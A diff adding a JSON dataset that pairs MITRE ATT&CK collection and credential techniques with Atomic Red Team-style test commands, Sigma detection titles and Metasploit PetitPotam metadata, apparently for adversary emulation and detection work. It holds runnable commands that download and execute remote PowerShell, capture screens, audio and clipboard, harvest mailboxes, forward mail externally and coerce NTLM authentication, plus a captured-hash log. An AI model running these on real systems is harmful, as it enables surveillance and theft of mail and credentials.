+          "command": "$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'\n$toolsDir = \"$env:TEMP\\bmc-tools.py\"\n \n# create output directory\nNew-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null\n\n# python script download\n& curl.exe -L $url --output $toolsDir\n \n# execution step\nif (Test-Path $toolsDir) { python $toolsDir -s \"#{cache_path}\" -d #{output_dir} -b }",
+          "cleanup": "Remove-Item \"$env:TEMP\\bmc-tools.py\" -ErrorAction SilentlyContinue\nRemove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue"
+        },
+        {
+          "executor": "sh",
+          "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;",
+          "cleanup": "for i in {1..5}; do /bin/rm screen-$i.png; done;"
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;",
+          "cleanup": "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Windows Screen Capture with CopyFromScreen",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.\nScreen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations"
+        },
+        {
+          "title": "Screen Capture Activity Via Psr.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks."
+        },
+        {
+          "title": "Windows Recall Feature Enabled Via Reg.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the enabling of the Windows Recall feature via registry manipulation.\nWindows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" value, or setting it to 0.\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary."
+        },
+        {
+          "title": "Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted",
+          "logsource": {
+            "category": "registry_delete",
+            "product": "windows"
+          },
+          "description": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" registry value.\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary."
+        },
+        {
+          "title": "Periodic Backup For System Registry Hives Enabled",
+          "logsource": {
+            "category": "registry_set",
+            "product": "windows"
+          },
+          "description": "Detects the enabling of the \"EnablePeriodicBackup\" registry value. Once enabled, The OS will backup System registry hives on restarts to the \"C:\\Windows\\System32\\config\\RegBack\" folder. Windows creates a \"RegIdleBackup\" task to manage subsequent backups.\nRegistry backup was a default behavior on Windows and was disabled as of \"Windows 10, version 1803\"."
+        },
+        {
+          "title": "Windows Recall Feature Enabled - Registry",
+          "logsource": {
+            "category": "registry_set",
+            "product": "windows"
+          },
+          "description": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by setting the value of \"DisableAIDataAnalysis\" to \"0\".\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1114",
+      "name": "T1114",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "Hacktool Ruler",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "This events that are generated when using the hacktool Ruler by Sensepost"
+        },
+        {
+          "title": "Exchange PowerShell Snap-Ins Usage",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1114.001",
+      "name": "Email Collection: Local Email Collection",
+      "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.",
+      "platforms": [
+        "windows",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}",
+          "cleanup": "Remove-Item #{output_file} -Force -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Powershell Local Email Collection",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may target user email on local systems to collect sensitive information.\nFiles containing email data can be acquired from a users local system, such as Outlook storage or cache files."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1114.002",
+      "name": "Email Collection: Remote Email Collection",
+      "description": "Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information.",
+      "platforms": [
+        "office-365"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2 = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}",
+          "cleanup": "connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome\nRemove-MgApplication $app.AppId\nRemove-Item -Path Cert:\\CurrentUser\\My\\$($cert.thumbprint) -DeleteKey\nDisconnect-MgGraph"
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1114.003",
+      "name": "Email Collection: Email Forwarding Rule",
+      "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.",
+      "platforms": [
+        "office-365"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"",
+          "cleanup": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }"
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1115",
+      "name": "Clipboard Data",
+      "description": "Add data to clipboard to copy off or execute commands from.",
+      "platforms": [
+        "windows",
+        "macos",
+        "linux",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt",
+          "cleanup": "del %temp%\\T1115.txt >nul 2>&1"
+        },
+        {
+          "executor": "powershell",
+          "command": "echo Get-Process | clip\nGet-Clipboard | iex",
+          "cleanup": null
+        },
+        {
+          "executor": "bash",
+          "command": "echo ifconfig | pbcopy\n$(pbpaste)",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"",
+          "cleanup": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "pbpaste",
+          "cleanup": null
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "Get-Clipboard -raw",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "xclip -o",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "PowerShell Get Clipboard",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_module",
+            "definition": "0ad03ef1-f21b-4a79-8ce8-e6900c54b65b"
+          },
+          "description": "A General detection for the Get-Clipboard commands in PowerShell logs. This could be an adversary capturing clipboard contents."
+        },
+        {
+          "title": "Data Copied To Clipboard Via Clip.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications."
+        },
+        {
+          "title": "PowerShell Get-Clipboard Cmdlet Via CLI",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of the 'Get-Clipboard' cmdlet via CLI"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1119",
+      "name": "Automated Collection",
+      "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.",
+      "platforms": [
+        "windows",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection",
+          "cleanup": "del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1"
+        },
+        {
+          "executor": "powershell",
+          "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}",
+          "cleanup": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null"
+        },
+        {
+          "executor": "powershell",
+          "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt",
+          "cleanup": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt",
+          "cleanup": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1"
+        },
+        {
+          "executor": "psh",
+          "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}",
+          "cleanup": "if ('#{windows.staging.location}' -match \"recycle[``|\\s]+bin\") {\n       $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value;\n       $StageDir = \"C:\\`$Recycle.Bin\\$sid\\s\";\n} else { $StageDir = '#{windows.staging.location}\\s'; };\nif (Test-Path -Path $StageDir) {Remove-Item -Force -Recurse $StageDir};",
+          "payloads": [
+            "file_search.ps1"
+          ]
+        },
+        {
+          "executor": "sh",
+          "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'",
+          "cleanup": "if [ -d '#{linux.staging.location}' ]; then rm -rf '#{linux.staging.location}/.s'; fi;",
+          "payloads": [
+            "file_search.sh"
+          ]
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Automated Collection Command PowerShell",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data."
+        },
+        {
+          "title": "Recon Information for Export with PowerShell",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data"
+        },
+        {
+          "title": "Automated Collection Command Prompt",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data."
+        },
+        {
+          "title": "Recon Information for Export with Command Prompt",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1120",
+      "name": "Peripheral Device Discovery",
+      "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
+      "platforms": [
+        "windows",
+        "darwin",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
+          "cleanup": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore"
+        },
+        {
+          "executor": "powershell",
+          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "fsutil fsinfo drives",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "Get-Printer",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "lpq -a",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "system_profiler SPUSBDataType",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Powershell Suspicious Win32_PnPEntity",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system."
+        },
+        {
+          "title": "Fsutil Drive Enumeration",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Attackers may leverage fsutil to enumerated connected drives."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1123",
+      "name": "Audio Capture",
+      "description": "Uses AudioDeviceCmdlets to set the default recording device and simulate audio capture.\nModule repo: [AudioDeviceCmdlets](https://github.com/frgnca/AudioDeviceCmdlets)",
+      "platforms": [
+        "windows",
+        "macos"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$mic = Get-AudioDevice -Recording\nSet-AudioDevice -ID $mic.ID\nStart-Sleep -Seconds 5",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+          "cleanup": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"
+        },
+        {
+          "executor": "sh",
+          "command": "sh #{filename} #{audiofile} #{duration}",
+          "cleanup": "if test -w #{audiofile}; then\n  rm #{audiofile}\nfi"
+        },
+        {
+          "executor": "psh",
+          "command": "if (-not (Get-Module -ListAvailable -Name AudioDeviceCmdlets)) {\n  Install-Module -Name AudioDeviceCmdlets -Force\n}\n$mic = Get-AudioDevice -Recording;\nSet-AudioDevice -ID $mic.ID;\nStart-Sleep -Seconds 5;",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Processes Accessing the Microphone and Webcam",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "Potential adversaries accessing the microphone and webcam in an endpoint."
+        },
+        {
+          "title": "Audio Capture via PowerShell",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects audio capture via PowerShell Cmdlet."
+        },
+        {
+          "title": "Audio Capture via SoundRecorder",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detect attacker collecting audio via SoundRecorder application."
+        },
+        {
+          "title": "Suspicious Camera and Microphone Access",
+          "logsource": {
+            "category": "registry_event",
+            "product": "windows"
+          },
+          "description": "Detects Processes accessing the camera and microphone from suspicious folder"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1125",
+      "name": "Video Capture",
+      "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+          "cleanup": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"
+        },
+        {
+          "executor": "cmd",
+          "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f &&\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+          "cleanup": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious Camera and Microphone Access",
+          "logsource": {
+            "category": "registry_event",
+            "product": "windows"
+          },
+          "description": "Detects Processes accessing the camera and microphone from suspicious folder"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1187",
+      "name": "Forced Authentication",
+      "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Possible PetitPotam Coerce Authentication Attempt",
+          "logsource": {
+            "product": "windows",
+            "service": "security",
+            "definition": "The advanced audit policy setting \"Object Access > Detailed File Share\" must be configured for Success/Failure"
+          },
+          "description": "Detect PetitPotam coerced authentication activity."
+        },
+        {
+          "title": "PetitPotam Suspicious Kerberos TGT Request",
+          "logsource": {
+            "product": "windows",
+            "service": "security",
+            "definition": "The advanced audit policy setting \"Account Logon > Kerberos Authentication Service\" must be configured for Success/Failure"
+          },
+          "description": "Detect suspicious Kerberos TGT requests.\nOnce an attacer obtains a computer certificate by abusing Active Directory Certificate Services in combination with PetitPotam, the next step would be to leverage the certificate for malicious purposes.\nOne way of doing this is to request a Kerberos Ticket Granting Ticket using a tool like Rubeus.\nThis request will generate a 4768 event with some unusual fields depending on the environment.\nThis analytic will require tuning, we recommend filtering Account_Name to the Domain Controller computer accounts."
+        },
+        {
+          "title": "Suspicious DNS Query Indicating Kerberos Coercion via DNS Object SPN Spoofing",
+          "logsource": {
+            "product": "windows",
+            "category": "dns_query"
+          },
+          "description": "Detects DNS queries containing patterns associated with Kerberos coercion attacks via DNS object spoofing.\nThe pattern \"1UWhRCAAAAA..BAAAA\" is a base64-encoded signature that corresponds to a marshaled CREDENTIAL_TARGET_INFORMATION structure.\nAttackers can use this technique to coerce authentication from victim systems to attacker-controlled hosts.\nIt is one of the strong indicators of a Kerberos coercion attack, where adversaries manipulate DNS records\nto spoof Service Principal Names (SPNs) and redirect authentication requests like CVE-2025-33073."
+        },
+        {
+          "title": "Attempts of Kerberos Coercion Via DNS SPN Spoofing",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the presence of \"UWhRC....AAYBAAAA\" pattern in command line.\nThe pattern \"1UWhRCAAAAA..BAAAA\" is a base64-encoded signature that corresponds to a marshaled CREDENTIAL_TARGET_INFORMATION structure.\nAttackers can use this technique to coerce authentication from victim systems to attacker-controlled hosts.\nIt is one of the strong indicators of a Kerberos coercion attack, where adversaries manipulate DNS records\nto spoof Service Principal Names (SPNs) and redirect authentication requests like in CVE-2025-33073.\nIf you see this pattern in the command line, it is likely an attempt to add spoofed Service Principal Names (SPNs) to DNS records,\nor checking for the presence of such records through the `nslookup` command."
+        }
+      ],
+      "metasploit_modules": [
+        {
+          "module_path": "auxiliary/scanner/dcerpc/petitpotam",
+          "module_type": "auxiliary",
+          "base_class": "Msf::Module",
+          "name": "PetitPotam",
+          "description": "Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.",
+          "authors": [
+            "GILLES Lionel",
+            "Spencer McIntyre"
+          ],
+          "platform": [],
+          "arch": [],
+          "session_types": [],
+          "privileged": null,
+          "rank": null,
+          "disclosure_date": null,
+          "default_target": null,
+          "cves": [
+            "2021-36942"
+          ],
+          "urls": [
+            "https://github.com/topotam/PetitPotam",
+            "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451"
+          ],
+          "edb_ids": [],
+          "msb_ids": [],
+          "osvdb_ids": [],
+          "bid_ids": [],
+          "mitre_techniques": [
+            {
+              "id": "T1187",
+              "name": "Forced Authentication"
+            },
+            {
+              "id": "T1212",
+              "name": "Exploitation For Credential Access"
+            }
+          ],
+          "notes": {
+            "stability": [],
+            "side_effects": [],
+            "reliability": [],
+            "aka": []
+          },
+          "compat": null,
+          "options": [],
+          "advanced_options": [],
+          "commands": [
+            {
+              "executor": "msfconsole",
+              "command": "use auxiliary/scanner/dcerpc/petitpotam && run",
+              "cleanup": null
+            }
+          ],
+          "has_documentation": true,
+          "scenario_output": "msf > use auxiliary/server/capture/smb \nmsf auxiliary(server/capture/smb) > run\n[*] Auxiliary module running as background job 0.\nmsf auxiliary(server/capture/smb) > \n[*] Server is running. Listening on 0.0.0.0:445\n\nmsf auxiliary(server/capture/smb) > use auxiliary/scanner/dcerpc/petitpotam \nmsf auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.96\nRHOSTS => 192.168.159.96\nmsf auxiliary(scanner/dcerpc/petitpotam) > set VERBOSE true\nVERBOSE => true\nmsf auxiliary(scanner/dcerpc/petitpotam) > run\n\n[*] 192.168.159.96:445    - Binding to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.159.96[\\lsarpc] ...\n[*] 192.168.159.96:445    - Bound to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.159.96[\\lsarpc] ...\n[*] 192.168.159.96:445    - Attempting to coerce authentication via EfsRpcOpenFileRaw\n\n[+] Received SMB connection on Auth Capture Server!\n[SMB] NTLMv2-SSP Client     : 192.168.250.237\n[SMB] NTLMv2-SSP Username   : MSFLAB\\WIN-3MSP8K2LCGC$\n[SMB] NTLMv2-SSP Hash       : 